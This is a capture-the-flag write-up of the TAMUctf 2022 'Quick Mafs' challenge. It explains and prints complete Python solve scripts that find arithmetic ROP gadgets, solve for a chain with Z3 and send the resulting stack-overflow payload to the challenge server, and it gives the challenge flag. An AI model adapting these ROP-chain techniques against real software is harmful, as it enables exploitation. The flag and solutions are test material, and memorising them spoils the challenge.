---
title: TAMUctf 2022 – Quick Mafs
description: ROP chaining on steroids.
updated: "2022-08-08"
tags:
 - reverse
 - pwn
 - python
 - programming
thumbnail: /img/posts/misc/ctf/inspector-gadget.png
usemathjax: true
related_tags: ctf writeup
---

{% include "toc.md" %}

### Challenge Description
> Oops! I dropped all of these arithmetic gadgets. Fortunately there are enough of them that you won't be able to pick out the right ones.... right?
> 
> This is an automatic reversing & exploitation challenge. The server will send you (in order) an instruction (they will be in the format `call print() with rax = 0x1234\n`) and an ELF binary as a newline terminated hex string. You should analyze the binary, construct a payload to accomplish that, and then send it back to the server as a newline terminated hex string. To receive the flag you will need to do this 5 times within a timeout of 10 minutes.

### Write-Up
Another automatic binary challenge! This time there's more emphasis on `pwn`, specifically ROP. We need to solve the challenge 5 times in under 10 minutes, giving us about 2 minutes per solve.

#### Preliminary Observations
Decompiling with ghidra, we immediately notice an unsuspicious section of code labelled `gadgets`. This contains loads of arithmetic gadgets. Our objective is to set `rax` to a certain value, presumably, using the gadgets we're given here.

![](/img/posts/misc/ctf/quick-mafs-1.jpg){.w-100}
{.center}

The first gadget we see is a simple MOV instruction. This allows us to set the initial value of `rax`.

All other gadgets are some variation of `lea rbx, <addr>; <op> ax, word ptr [rbx]`, where `<addr>` points to some byte in the data region, and `<op>` is one of `add`, `sub`, or `xor`. In other words, each of these gadgets will load a constant, and add/subtract/xor it with `ax` (the lower 16 bytes of `rax`).

Since there are so many gadgets, it would be illogical to try to compute the gadgets needed by hand. We'll probably need the help of a constraint solver, Z3. But before we get there, let's outline the ROP plan first.

As for the general structure of the program, we have `_start`, `vuln`, and `print`. `_start` just calls `vuln`, so nothing interesting. `vuln`, on the other hand, performs a read syscall, reading from stdin, setting `rsp` as the buffer, and with a length of 0x2000. So we have everything setup for unlimited ROPping. Sweet!

#### ROP ROP ROP Your Boat
Before we carry on, there are a few things we should note:

* The `rbp` is popped off the stack before the `ret` in `vuln`. Our ROP chains will only be called after the pop.
* We're limited to 0x2000 characters in the read syscall. However, due to limits on the stack size, we may only have up to about 4000 characters (by checking gdb, gef, vmmap).
* We need to call `print` once `ax` is set to whatever value we're asked.

This means:

* We should add 8 bytes of padding as our "dummy" `rbp`.
* Our gadget payload shouldn't be more than 4000 chars long, to set some realistic limits.
* We should add 8 bytes to call `print` after the gadget payload.

#### Inspect-our Gadgets
![](/img/posts/misc/ctf/inspector-gadget.png){.w-25}
{.center}

Firstly, we'll load all the provided arithmetic gadgets into a list for convenience. Using [`ROPgadget`](https://github.com/JonathanSalwan/ROPgadget) and hacking a bit into the tool, we start with the following code:

```py
# solve.py
from pwn import *
import re
from ropgadget.args import Args as ropargs
from ropgadget.core import Core as ropcore


def is_good_gadget(g):
    return g['gadget'].startswith('lea rbx') and g['gadget'].endswith('ret')


def solve(target: int, file='elf'):
    def resolve_gadget(gadget):
        m = re.match(r'lea rbx, \[0x([0-9a-f]+)\] ; (\w+) ax, word ptr \[rbx\] ; ret', gadget['gadget'])
        if m.group(2) not in ['add', 'sub', 'xor']:
            raise RuntimeError('operation unknown')
        const_addr = int(m.group(1), 16)
        return {'vaddr': gadget['vaddr'], 'op': m.group(2), 'const': elf.u16(const_addr)}

    # `--depth 15` is important, as it tells ROPgadget to search for longer chains.
    core = ropcore(ropargs(f'--binary {file} --depth 15 --silent'.split()).getArgs())
    if not core.analyze():
        raise RuntimeError("ROPgadget: error analyzing elf")

    good_gadgets = [*map(resolve_gadget, filter(is_good_gadget, core.gadgets()))]
```

All our arithmetic gadgets are now stored in `good_gadgets`, which is a list of dictionaries. Each dictionary contains has a `vaddr` key (the address of the gadget), an `op` key (the operation of the gadget: `'add'`/`'sub'`/`'xor'`), and a `const` key (the value of the constant being applied). The next step is to separate them into the `add`, `sub`, and `xor` ROP gadgets. Those are the only three categories of arithmetic available.

```py
    xor_gadgets = [*filter(lambda g: g['op'] == 'xor', good_gadgets)]
    add_gadgets = [*filter(lambda g: g['op'] == 'add', good_gadgets)]
    sub_gadgets = [*filter(lambda g: g['op'] == 'sub', good_gadgets)]
```

Now comes the fun part... solving our way to `rax` using a constraint solver...

#### ZZZ
We'll use Z3 as our constraint solver. Our approach to solving this is...

Let $c$ be the init constant, moved to `rax` in the first gadget. Let $r$ be the target `rax`. Let $a_i$, $s_i$, and $x_i$ be the constants of the $i$-th add, subtract, and xor gadget respectively. These variables are all known constants.
<a id="equation"></a>
<br/>  
Further, let $m_i$, $n_i$, and $p_i$ be the number of the $i$-th add, subtract, and xor gadget to apply; and constrain $m_i, n_i, p_i \in \mathbb{Z}^+ \cup \{0\}$. These are unknown variables. We want to solve for these sets of variables such that
<br/>
\begin{align}
c + \sum a_im_i - \sum s_in_i = \left(\bigwedge x_ip_i\right) \wedge r
\end{align}
{.alert--info}

Our strategy now is to build up this equation using Z3 symbols, then throw the equation at the Z3 solver and get back solution sets for all $m_i, n_i, p_i$.

The first thing we want to do is to set up our symbols. We'll use Z3's `BitVec`tors to create our unknown 16-bit unsigned integers $m_i, n_i, p_i$. Why 16 bits? Because the gadgets operate on the `ax` register, which is only 16 bits wide.

```py
    from z3 import *

    # Create 16-bit BVs. m_i denotes the number of times we apply the a_i gadget.
    add_vars = [BitVec(f'm_{i}', 16) for i in range(len(add_gadgets))] # m
    sub_vars = [BitVec(f'n_{i}', 16) for i in range(len(sub_gadgets))] # n
    xor_vars = [BitVec(f'p_{i}', 16) for i in range(len(xor_gadgets))] # p

    # Address containing the `mov rax, XXX; ret` gadget.
    init_rax_addr = 0x401004
    rax_init_value = elf.u16(init_rax_addr + 3)
```

Keep in mind that these are all symbols, not concrete values.

Now we have everything we need to construct our [equation](#equation). We have:

* $c$ (`rax_init_value`),
* $r$ (`target`, provided as a function parameter),
* $a_i$ (`add_gadgets[i].const`),
* $s_i$ (`sub_gadgets[i].const`),
* $x_i$ (`xor_gadgets[i].const`),
* $m_i$ (`add_vars`),
* $n_i$ (`sub_vars`), and
* $p_i$ (`xor_vars`).

We can begin constructing constraints and feeding things to a Z3 solver!

```py
    # Create solver.
    s = Solver()

    add_terms = [v * BitVecVal(g['const'], 16) for v, g in zip(add_vars, add_gadgets)]
    sub_terms = [v * BitVecVal(g['const'], 16) for v, g in zip(sub_vars, sub_gadgets)]
    xor_terms = [v * BitVecVal(g['const'], 16) for v, g in zip(xor_vars, xor_gadgets)]

    # XOR everything in xor_terms.
    from functools import reduce
    xor_all = reduce(lambda x, y: x ^ y, xor_terms)

    # Add base constraint which ties everything together.
    s.add(BitVecVal(rax_init_value, 16) + Sum(add_terms) - Sum(sub_terms) == BitVecVal(target, 16) ^ xor_all)
```

But this constraint isn't enough. Without other contraints, Z3 would return ginormous values which technically satisfy the equation. But there's no way we can call a gadget 1851138 times or -29301 times. We'll need some constraints to limit the values the symbols can take on.

```py
    # Bounds constraints.
    addsub_limit = 100
    s.add(And([ULT(bv, addsub_limit) for bv in add_vars]))
    s.add(And([ULT(bv, addsub_limit) for bv in sub_vars]))
    s.add(And([ULE(bv, 1) for bv in xor_vars]))   # Boolean property.

    # Limitting constraint. Total number of gadgets shouldn't exceed a limit.
    gadget_limit = 400 # 4000 bytes limit divide by 8 bytes per gadget.
    s.add(1 + Sum(add_vars) + Sum(sub_vars) + Sum(xor_vars) <= gadget_limit)
```

Now that we limit our gadgets properly, we can move on to our final step: evaluation. We'll kindly ask Z3 to spit out a solution, and construct our payload.

```py
    # Check satisfiability (and also compute a solution).
    if s.check() != sat:
        raise RuntimeError('unable to satisfy constraints')
    m = s.model()

    # Initialise rax first. (8 byte padding for rbp.)
    chain = b'A'*8 + p64(init_rax_addr)

    # Chain add gadgets.
    for bv, g in zip(add_vars, add_gadgets):
        chain += p64(g['vaddr']) * m.evaluate(bv).as_long()
        # m.evaluate(bv).as_long()...
        #   == 0 => nothing is added to the chain.
        #   == 1 => call (chain) gadget once.
        #   == 2 => call (chain) gadget twice.
        #   etc...

    # Chain subtract gadgets.
    for bv, g in zip(sub_vars, sub_gadgets):
        chain += p64(g['vaddr']) * m.evaluate(bv).as_long()

    # Chain xor gadgets.
    for bv, g in zip(xor_vars, xor_gadgets):
        chain += p64(g['vaddr']) * m.evaluate(bv).as_long()

    # Finally call print.
    chain += p64(elf.sym['print'])

    # And we're done!
    return chain
```

After modifying the template code to use this procedure, running the code and waiting for a bit, we soon end up with the flag!

### Solve Scripts
```py
# script.py
from pwn import *
import re
from solve import solve

context.log_level = 'debug'

def pwn():
    p = remote("tamuctf.com", 443, ssl=True, sni="quick-mafs")

    for _ in range(5):
        instructions = p.recvline() # the server will give you instructions as to what your exploit should do
        bites = p.recvline().rstrip()

        # Error (wrong answer, or connection was closed).
        if bites.startswith(b'sorry') or bites.startswith(b'Traceback'):
            break

        # Save bytes to a file.
        with open("elf", "wb") as file:
            file.write(bytes.fromhex(bites.decode()))

        print(f'{instructions=}')

        # Parse input and get target value.
        m = re.search(r'call print\(\) with rax = 0x([0-9a-f]+)', instructions.decode())
        target = int(m.group(1), 16)
        print(f'{target=:#x}')

        payload = solve(target, gadget_limit=20)
        p.sendline(payload.hex().encode())

    p.interactive()

try:
    pwn()
except EOFError:
    pass
```

```py
# solve.py
from pwn import *
import re
from z3 import *
from functools import reduce

from ropgadget.args import Args as ropargs
from ropgadget.core import Core as ropcore


def is_good_gadget(g):
    return g['gadget'].startswith('lea rbx') and g['gadget'].endswith('ret')


def solve(target: int, file='elf', *, addsub_limit=100, gadget_limit=400):
    elf = ELF(file)

    print(f'solving for rax = {target:#x}')

    def resolve_gadget(gadget):
        m = re.match(
            r'lea rbx, \[0x([0-9a-f]+)\] ; (\w+) ax, word ptr \[rbx\] ; ret', gadget['gadget'])
        if m.group(2) not in ['add', 'sub', 'xor']:
            raise RuntimeError('operation unknown')
        const_addr = int(m.group(1), 16)
        return {'vaddr': gadget['vaddr'], 'op': m.group(2), 'const': elf.u16(const_addr)}


    # `--depth 15` is important, as it tells ROPgadget to search for longer chains.
    core = ropcore(ropargs(f'--binary {file} --depth 15 --silent'.split()).getArgs())
    if not core.analyze():
        raise RuntimeError("ROPgadget: error analyzing elf")

    # Address containing the `mov rax, XXX; ret` gadget.
    init_rax_addr = 0x401004
    rax_init_value = elf.u16(init_rax_addr + 3)

    good_gadgets = [*map(resolve_gadget, filter(is_good_gadget, core.gadgets()))]
    print(len(good_gadgets))

    # Find and categorise gadgets.
    xor_gadgets = [*filter(lambda g: g['op'] == 'xor', good_gadgets)]
    add_gadgets = [*filter(lambda g: g['op'] == 'add', good_gadgets)]
    sub_gadgets = [*filter(lambda g: g['op'] == 'sub', good_gadgets)]
    print(len(xor_gadgets))
    print(len(add_gadgets))
    print(len(sub_gadgets))

    add_vars = [BitVec(f'na_{i}', 16) for i in range(len(add_gadgets))]
    sub_vars = [BitVec(f'ns_{i}', 16) for i in range(len(sub_gadgets))]
    xor_vars = [BitVec(f'nx_{i}', 16) for i in range(len(xor_gadgets))]
    add_terms = [v * BitVecVal(g['const'], 16) for v, g in zip(add_vars, add_gadgets)]
    sub_terms = [v * BitVecVal(g['const'], 16) for v, g in zip(sub_vars, sub_gadgets)]
    xor_terms = [v * BitVecVal(g['const'], 16) for v, g in zip(xor_vars, xor_gadgets)]

    # XOR everything in xor_terms.
    xor_all = reduce(lambda x, y: x ^ y, xor_terms)

    s = Solver()

    # Add base constraint which ties everything together.
    s.add(BitVecVal(rax_init_value, 16) + Sum(add_terms) - Sum(sub_terms) == BitVecVal(target, 16) ^ xor_all)

    # Bounds constraints.
    s.add(And([ULT(bv, addsub_limit) for bv in add_vars]))
    s.add(And([ULT(bv, addsub_limit) for bv in sub_vars]))
    s.add(And([ULE(bv, 1) for bv in xor_vars]))   # Boolean property.

    # Limitting constraint. Total number of gadgets shouldn't exceed a limit.
    s.add(1 + Sum(add_vars) + Sum(sub_vars) + Sum(xor_vars) <= gadget_limit)

    # Check satisfiability (and also compute a solution).
    print('sat? ', s.check(), '\n')
    if s.check() != sat:
        raise RuntimeError('unable to satisfy constraints')
    m = s.model()

    # Sanity checking.
    print('add vars:', [*map(m.evaluate, add_vars)], '\n')
    print('sub vars:', [*map(m.evaluate, sub_vars)], '\n')
    print('xor vars:', [*map(m.evaluate, xor_vars)], '\n')

    print('total ops:', m.evaluate(Sum(add_vars) + Sum(sub_vars) + Sum(xor_vars)))

    # Prepend 8 bytes of padding for rbp.
    chain = b'A'*8

    # Initialise rax.
    chain += p64(init_rax_addr)

    # Chain add gadgets.
    for bv, g in zip(add_vars, add_gadgets):
        chain += p64(g['vaddr']) * m.evaluate(bv).as_long()

    # Chain subtract gadgets.
    for bv, g in zip(sub_vars, sub_gadgets):
        chain += p64(g['vaddr']) * m.evaluate(bv).as_long()

    # Chain xor gadgets.
    for bv, g in zip(xor_vars, xor_gadgets):
        chain += p64(g['vaddr']) * m.evaluate(bv).as_long()

    # Finally call print.
    chain += p64(elf.sym['print'])

    print('payload length:', len(chain))
    return chain
```

### Flag
```
gigem{7w0_qu4dr1ll10n?_7h475_r34lly_qu1ck_m47h}
```
